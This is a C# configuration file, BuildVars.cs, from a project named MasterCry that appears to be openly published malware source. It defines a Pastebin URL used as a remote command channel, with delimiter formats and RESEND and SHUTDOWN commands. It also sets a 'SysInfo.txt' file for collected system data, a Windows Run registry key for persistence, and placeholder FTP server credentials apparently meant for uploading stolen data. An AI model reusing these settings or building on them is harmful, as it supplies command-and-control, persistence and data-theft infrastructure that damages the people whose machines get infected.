
/****************************** ghost1372.github.io ******************************\
*	Module Name:	BuildVars.cs
*	Project:		MasterCry
*	Copyright (C) 2017 Mahdi Hosseini, All rights reserved.
*	This software may be modified and distributed under the terms of the MIT license.  See LICENSE file for details.
*
*	Written by Mahdi Hosseini <Mahdidvb72@gmail.com>,  2017, 9, 21, 03:21 ب.ظ
*	
***********************************************************************************/

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace MasterCry
{
    class BuildVars
    {
        public static string Save_Location = "SysInfo.txt";
        public static string Save_Items_Location = "items.txt";

        public static string Command_URL = "https://pastebin.com/raw/QF4BXM6D";
        public static string Command_URL_Symbol = "###";
        public static string Command_VER_Symbol = "$$$";
        public static string Command_COM_Symbol = "@@@";

        public static string Command_RESEND = "RESEND";
        public static string Command_SHUTDOWN = "SHUTDOWN";


        //Example Command =>    ###http://test.com###$$$VERSION$$$@@@COMMAND@@@

        public static string Exe_Name = "command.exe";
        public static string Config_Command_Version = "CommandVersion";
        public static string Registry_AppName = "ApplicationName";
        public static string Registry_Key = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        public static string FTP_SERVER = "ftp://Hostname.com";
        public static string FTP_USER = "USER";
        public static string FTP_PASS = "PASS";


    }
}
